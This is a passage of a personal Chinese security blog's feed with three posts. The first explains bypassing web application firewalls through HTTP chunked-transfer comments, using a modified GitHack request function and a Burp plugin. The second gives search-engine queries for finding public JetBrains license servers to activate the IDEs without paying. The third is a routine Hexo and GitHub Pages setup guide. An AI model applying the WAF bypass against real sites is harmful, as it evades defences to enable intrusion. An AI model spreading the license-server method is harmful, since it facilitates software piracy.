src="/img/%E5%88%A9%E7%94%A8HTTP%E5%8D%8F%E8%AE%AE%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BB%95%E8%BF%87WAF/5.png"></p><p>利用分块传输绕过，但由于该方法只能在POST方法中使用，且必须有请求体，所以要先将GET请求转为POST请求，并插入任意数据，最后再进行chunk编码。</p><p>但是有一些如Imperva的，360等比较好的WAF已经对传输编码的分块传输做了处理，可以把分块组合成完整的HTTP数据包，这时直接使用常规的分块传输方法尝试绕过的话，会被WAF直接识别并阻断，像下图所示。</p><p><img src="/img/%E5%88%A9%E7%94%A8HTTP%E5%8D%8F%E8%AE%AE%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BB%95%E8%BF%87WAF/6.png"></p><p>使用注释扰乱分块数据包，在[<a href="https://tools.ietf.org/html/rfc7230">RFC7230</a>]中查看到有关分块传输的定义规范,分块传输可以在长度标识处加上分号<code>“;”</code>作为注释。</p><p>几乎所有可以识别<code>Transfer-Encoding</code>数据包的WAF，都没有处理分块数据包中长度标识处的注释，导致在分块数据包中加入注释，WAF就识别不出这个数据包了。</p><p><img src="/img/%E5%88%A9%E7%94%A8HTTP%E5%8D%8F%E8%AE%AE%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BB%95%E8%BF%87WAF/7.png"></p><p>当然，有大佬已经将这个方法写成了burp插件<a href="https://github.com/c0ny1/chunked-coding-converter">Chunked coding converter</a>，为了方便在burp上快速的进行分块传输测试，主要有以下功能：</p><ul><li><p>在Burp Repeater套件上可对数据包进行快速chunked解码编码</p></li><li><p>自动化对Burp的Proxy，scanner，spider等套件的数据包进行编码</p></li><li><p>可设置分块长度，是否开启注释</p></li></ul><p>接下来就是通过<a href="https://github.com/lijiejie/GitHack">Githack</a>和<code>Chunked coding converter</code>插件的联动</p><p>首选需要先稍微改动下<code>Githack</code>工具的代码，更改请求方式<code>GET-&gt;POST</code>，并插入任意请求体：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_request_data</span>(<span class="params">url</span>):</span><br><span class="line">    post_data = &#123;<span class="string">&#x27;test&#x27;</span>: <span class="string">&#x27;test&#x27;</span>&#125;</span><br><span class="line">    data = urllib.urlencode(post_data)</span><br><span class="line">    request = urllib2.Request(url, data, &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; zh-cn) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27&#x27;</span>&#125;)</span><br><span class="line">    <span class="comment">#request = urllib2.Request(url, None, &#123;&#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X)&#x27;&#125;)</span></span><br><span class="line">    <span class="keyword">return</span> urllib2.urlopen(request, context=context).read()</span><br></pre></td></tr></table></figure><p>再配置<code>Chunked coding converter</code>对Proxy套件的数据包进行编码</p><p><img src="/img/%E5%88%A9%E7%94%A8HTTP%E5%8D%8F%E8%AE%AE%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BB%95%E8%BF%87WAF/8.png"></p><p>最后对绕过WAF进行漏洞利用展示：</p><p><img src="/img/%E5%88%A9%E7%94%A8HTTP%E5%8D%8F%E8%AE%AE%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BB%95%E8%BF%87WAF/9.png"></p><hr><p>持续学习……</p><p>参考资料：<br><a href="https://cloud.tencent.com/developer/article/2149056">WAF分块传输绕过</a><br><a href="https://saucer-man.com/information_security/100.html">利用分块传输协议绕waf</a><br><a href="https://www.anquanke.com/post/id/169738">利用分块传输吊打所有WAF</a><br><a href="https://www.freebuf.com/news/193659.html">在HTTP协议层面绕过WAF</a><br><a href="https://gv7.me/articles/2019/chunked-coding-converter/">编写Burp分块传输插件绕WAF</a></p><p>看到了，但暂时还未用到：<br><a href="https://gv7.me/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/">Java反序列化数据绕WAF之延时分块传输</a><br><a href="https://cloud.tencent.com/developer/article/2149060">WAF延时分块传输绕过</a><br><a href="https://cloud.tencent.com/developer/article/2149082">WAF HTTP协议覆盖+分块传输组合绕过</a><br><a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/Bypass%20WAF/bypass%20waf%EF%BC%88%E5%9B%9B%E4%B8%AA%E5%B1%82%E6%AC%A1%EF%BC%89.md">Bypass waf（四个层次）</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近在实战中遇到太多Fortieth的WAF——FortiWeb。做啥都被拦，这能忍？摇人！和一个大佬沟通了下，他说用&lt;code&gt;分块传输&lt;</summary>
      
    
    
    
    <category term="奇淫技巧" scheme="https://0or1zo.github.io/categories/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/"/>
    
    
    <category term="chunked" scheme="https://0or1zo.github.io/tags/chunked/"/>
    
    <category term="绕WAF" scheme="https://0or1zo.github.io/tags/%E7%BB%95WAF/"/>
    
  </entry>
  
  <entry>
    <title>Jetbrains全家桶激活</title>
    <link href="https://0or1zo.github.io/2024/10/21/Jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6%E6%BF%80%E6%B4%BB/"/>
    <id>https://0or1zo.github.io/2024/10/21/Jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6%E6%BF%80%E6%B4%BB/</id>
    <published>2024-10-21T14:10:03.000Z</published>
    <updated>2024-10-23T13:17:35.754Z</updated>
    
    <content type="html"><![CDATA[<div class="note green icon-padding flat"><i class="note-icon fas fa-share-alt"></i><p>分享！JetBrains系列全家桶激活服务器 (每日更新)：<a href="https://jetbrains.asiones.com/">https://jetbrains.asiones.com/</a></p></div><hr><h1 id="JetBrains-License-Server-（FLS）"><a href="#JetBrains-License-Server-（FLS）" class="headerlink" title="JetBrains License Server （FLS）"></a>JetBrains License Server （FLS）</h1><p>互联网上有很多公开的开放<code>Jetbrains</code>激活服务器。利用这些服务器就可以直接激活<code>Jetbrains</code>的所有产品。</p><p><strong>好处</strong>：类似于微软的KMS，不需要打补丁，直接连接FLS激活。一般大厂（授权数大于50台设备）都是用这个方法激活。</p><p><strong>缺点</strong>：需要联网，每隔30天重新激活一次，且服务器失效后需要找个新服务器激活。</p><div class="note info flat"><p>如果有需要，可通过网络空间搜索引擎自行寻找。</p></div><h2 id="Fofa"><a href="#Fofa" class="headerlink" title="Fofa"></a>Fofa</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header=&quot;https://account.jetbrains.com/fls-auth&quot;</span><br></pre></td></tr></table></figure><h2 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Location: https://account.jetbrains.com/fls-auth</span><br></pre></td></tr></table></figure><h2 id="Censys"><a href="#Censys" class="headerlink" title="Censys"></a>Censys</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services.http.response.headers.location: account.jetbrains.com/fls-auth</span><br></pre></td></tr></table></figure><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="通过Fofa搜索激活服务器地址"><a href="#通过Fofa搜索激活服务器地址" class="headerlink" title="通过Fofa搜索激活服务器地址"></a>通过Fofa搜索激活服务器地址</h3><p><img src="/img/Jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6%E6%BF%80%E6%B4%BB/1.png"></p><h3 id="激活IDE"><a href="#激活IDE" class="headerlink" title="激活IDE"></a>激活IDE</h3><p><img src="/img/Jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6%E6%BF%80%E6%B4%BB/2.png"></p><p><img src="/img/Jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6%E6%BF%80%E6%B4%BB/3.png"></p><p>如果显示网络错误，可能需要使用魔法。</p><p>个别地址不能够使用的话，那就换个地址，直到Licensed。</p><hr><p>目前没找到自动检测服务器是否有效的方法，后续如果有方法验证，会进行补充。</p><p>也可自行搭建<code>JetBrains</code>激活服务器，请参考：<a href="https://blog.naixi.net/article/jetbrains-license">https://blog.naixi.net/article/jetbrains-license</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;div class=&quot;note green icon-padding flat&quot;&gt;&lt;i class=&quot;note-icon fas fa-share-alt&quot;&gt;&lt;/i&gt;&lt;p&gt;分享！JetBrains系列全家桶激活服务器 (每日更新)：&lt;a href=&quot;https://jetbra</summary>
      
    
    
    
    <category term="软件激活破解" scheme="https://0or1zo.github.io/categories/%E8%BD%AF%E4%BB%B6%E6%BF%80%E6%B4%BB%E7%A0%B4%E8%A7%A3/"/>
    
    
    <category term="Jetbrains" scheme="https://0or1zo.github.io/tags/Jetbrains/"/>
    
  </entry>
  
  <entry>
    <title>Github+Hexo搭建个人Blog网站</title>
    <link href="https://0or1zo.github.io/2024/10/20/Github+Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BABlog%E7%BD%91%E7%AB%99/"/>
    <id>https://0or1zo.github.io/2024/10/20/Github+Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BABlog%E7%BD%91%E7%AB%99/</id>
    <published>2024-10-20T07:04:44.000Z</published>
    <updated>2024-11-12T14:40:14.644Z</updated>
    
    <content type="html"><![CDATA[<div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>本文章仅记录博主自己在使用Github+Hexo搭建个人Blog网站的整个过程和遇到问题的解决。</p></div><div class="note green icon-padding flat"><i class="note-icon fas fa-rocket"></i><p>本博客所使用的主题为butterfly 5.0.0，如有遇到问题，请访问<a href="https://butterfly.js.org/">Butterfly官网</a>查看详细的教程介绍。</p></div><div class="note red icon-padding flat"><i class="note-icon far fa-hand-peace"></i><p>梦想从这里启航！</p></div><hr><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="申请一个Github账号"><a href="#申请一个Github账号" class="headerlink" title="申请一个Github账号"></a>申请一个<a href="https://github.com/">Github</a>账号</h2><h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p>Git官网下载地址: <a href="https://git-scm.com/downloads/win">https://git-scm.com/downloads/win</a></p><p><img src="/img/Github+Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BABlog%E7%BD%91%E7%AB%99/1.png"></p><h2 id="安装NodeJs和npm"><a href="#安装NodeJs和npm" class="headerlink" title="安装NodeJs和npm"></a>安装NodeJs和npm</h2><p>nodejs官网下载地址：<a href="https://nodejs.org/zh-cn/download/package-manager">https://nodejs.org/zh-cn/download/package-manager</a></p><p><img src="/img/Github+Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BABlog%E7%BD%91%E7%AB%99/2.png"></p><p>双击安装包，按照默认选项，一路点击<code>Next</code>即可，安装完成后，msi格式的安装包会自动添加环境变量。</p><p>在cmd窗口，执行<code>node -v</code>查看node版本。</p><p><img src="/img/Github+Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BABlog%E7%BD%91%E7%AB%99/3.png"></p><p>在安装node的同时也安装了npm，执行<code>npm -v</code>查看npm版本。</p><p><img src="/img/Github+Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BABlog%E7%BD%91%E7%AB%99/4.png"></p><p>到这就已经可以正常使用了，以下步骤是个人为了更好的管理，从而修改相关的一些环境配置，并不是必须的。</p><h3 id="修改全局包路径"><a href="#修改全局包路径" class="headerlink" title="修改全局包路径"></a>修改全局包路径</h3><p>下载全局包默认保存在C盘下，可通过<code>npm root -g</code>命令查看当保存路径，我将这个路径设置到npm的安装路径下，一方面是节省C盘存储空间，另一方面便于个人管理。</p><p>在安装目录下创建两个文件夹，<code>node_global</code>全局包存储文件夹，<code>node_cache</code>node缓存文件夹。</p><p><img src="/img/Github+Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BABlog%E7%BD%91%E7%AB%99/5.png"></p><p>执行以下命令进行修改</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> prefix &quot;D:\nodejs\node_global&quot;</span><br><span class="line">npm config <span class="built_in">set</span> cache &quot;D:\nodejs\node_cache&quot;</span><br></pre></td></tr></table></figure><h3 id="修改环境变量"><a href="#修改环境变量" class="headerlink" title="修改环境变量"></a>修改环境变量</h3><p>修改完npm全局模块的存储路径和cache路径后，还需要修改相应的环境变量。</p><p>修改用户变量Path，添加<code>node_global</code>和<code>node_cache</code>路径</p><p><img src="/img/Github+Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BABlog%E7%BD%91%E7%AB%99/6.png"></p><p>添加系统变量<code>NODE_PATH</code></p><p><img src="/img/Github+Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BABlog%E7%BD%91%E7%AB%99/7.png"></p><h1 id="创建Github存储库"><a href="#创建Github存储库" class="headerlink" title="创建Github存储库"></a>创建Github存储库</h1><p>登录Github，创建一个新的代码存储库用于保存Blog的源码文件。</p><p>登录Github账号，点击右上角用户个人头像，点击<code>Your repositories</code>，进入个人存储库页面。</p><p><img src="/img/Github+Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BABlog%E7%BD%91%E7%AB%99/8.png"></p><p>点击<code>New</code>进入存储库创建页面。</p><p><img src="/img/Github+Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BABlog%E7%BD%91%E7%AB%99/9.png"></p><p>填写存储库名称，格式必须为Github上的账户名，然后点击<code>Create repository</code>。</p><div class="note warning flat"><p>注：GitHub 不允许在不公开代码库（repository）的情况下直接展示博客内容。通常，GitHub Pages 是用来托管静态网站的，但前提是托管的 repository 必须是公开的。GitHub 没有直接支持私有仓库通过 Pages 展示内容的功能。</p></div><p><img src="/img/Github+Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BABlog%E7%BD%91%E7%AB%99/10.png"></p><p>创建新文件，作为网站的主页，新文件的名字必须为<code>index.html</code>，码入内容随意后点击<code>Commit changes...</code>提交</p><p><img src="/img/Github+Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BABlog%E7%BD%91%E7%AB%99/11.png"></p><p><img src="/img/Github+Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BABlog%E7%BD%91%E7%AB%99/12.png"></p><p>访问blog链接，也就是存储库名称，<a href="https://0or1zo.github.io/">https://0or1zo.github.io/</a></p><p><img src="/img/Github+Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BABlog%E7%BD%91%E7%AB%99/13.png"></p><h1 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h1><p><code>hexo</code>是一个基于<code>nodejs</code>的静态博客网站生成器，详情访问hexo官网：<a href="https://hexo.io/zh-cn/">https://hexo.io/zh-cn/</a></p><p>安装hexo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>查看版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure><p>创建一个项目Blog并初始化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init Blog</span><br><span class="line">cd Blog</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>本地启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g // 生成静态文件到public目录中</span><br><span class="line">hexo s // 启动本地服务器</span><br></pre></td></tr></table></figure><h1 id="安装Butterfly主题"><a href="#安装Butterfly主题" class="headerlink" title="安装Butterfly主题"></a>安装Butterfly主题</h1><p>博主使用的主题是<code>Butterfly</code>主题，官网地址：<a href="https://butterfly.js.org/">https://butterfly.js.org/</a></p><p>下载主题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd Blog</span><br><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><p>修改主题，打开根目录下的<code>_config.yml</code>文件，这个文件为站点的配置文件。</p><p><img src="/img/Github+Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BABlog%E7%BD%91%E7%AB%99/14.png"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">butterfly</span></span><br></pre></td></tr></table></figure><p>重新启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><h1 id="部署到Github-Pages"><a href="#部署到Github-Pages" class="headerlink" title="部署到Github Pages"></a>部署到Github Pages</h1><h2 id="方法一：安装hexo-deployer-git"><a href="#方法一：安装hexo-deployer-git" class="headerlink" title="方法一：安装hexo-deployer-git"></a>方法一：安装hexo-deployer-git</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>修改根目录下的_config.yml，配置Github相关信息。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">    <span class="attr">repo:</span> <span class="string">https://github.com/0or1zo/0or1zo.github.io.git</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">main</span></span><br><span class="line">    <span class="attr">token:</span> </span><br></pre></td></tr></table></figure><p><code>token</code>从Github的<code>Personal access tokens</code>获取，<code>Settings</code> -&gt; <code>Developer settings</code> -&gt; <code>Personal access tokens</code> -&gt; <code>Tokens(classic)</code></p><p><img src="/img/Github+Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BABlog%E7%BD%91%E7%AB%99/15.png"></p><p>部署到Github</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g -d // -d 将项目进行部署</span><br></pre></td></tr></table></figure><p>浏览器访问博客地址<a href="https://0or1zo.github.io/">https://0or1zo.github.io/</a> ，部署成功。</p><p><img src="/img/Github+Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BABlog%E7%BD%91%E7%AB%99/16.png"></p><h2 id="方法二：将源码推送到Github上"><a href="#方法二：将源码推送到Github上" class="headerlink" title="方法二：将源码推送到Github上"></a>方法二：将源码推送到Github上</h2><p>直接将<code>public</code>目录下的所有文件推送至存储库中。</p><p><img src="/img/Github+Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BABlog%E7%BD%91%E7%AB%99/17.png"></p><h1 id="遇到的一些问题"><a href="#遇到的一些问题" class="headerlink" title="遇到的一些问题"></a>遇到的一些问题</h1><h2 id="Hexo-Butterfly启动页面显示extends-includes-layout-pug-block-content-include-includes-recent-posts-pug-include"><a href="#Hexo-Butterfly启动页面显示extends-includes-layout-pug-block-content-include-includes-recent-posts-pug-include" class="headerlink" title="Hexo+Butterfly启动页面显示extends includes&#x2F;layout.pug block content include includes&#x2F;recent-posts.pug include"></a>Hexo+Butterfly启动页面显示extends includes&#x2F;layout.pug block content include includes&#x2F;recent-posts.pug include</h2><p>Hexo更改主题后启动服务器，界面显如下字符:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extends includes/layout.pug block content include ./includes/mixins/indexPostUI.pug +indexPostUI</span><br></pre></td></tr></table></figure><p>这是<strong>因为没有pug以及stylus的渲染器</strong>。</p><p>解决方案:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>清除缓存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure><p>生成静态文件即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure><hr><p>梦！想从这里启航？</p>]]></content>
    
    
      
      
    <summary type="html">&lt;div class=&quot;note blue icon-padding flat&quot;&gt;&lt;i class=&quot;note-icon fas fa-bullhorn&quot;&gt;&lt;/i&gt;&lt;p&gt;本文章仅记录博主自己在使用Github+Hexo搭建个人Blog网站的整个过程和遇到问题的解决。&lt;/p&gt;
&lt;/</summary>
      
    
    
    
    <category term="环境搭建" scheme="https://0or1zo.github.io/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="github" scheme="https://0or1zo.github.io/tags/github/"/>
    
    <category term="hexo" scheme="https://0or1zo.github.io/tags/hexo/"/>
    
    <category term="butterfly" scheme="https://0or1zo.github.io/tags/butterfly/"/>
    
  </entry>
  
</feed>
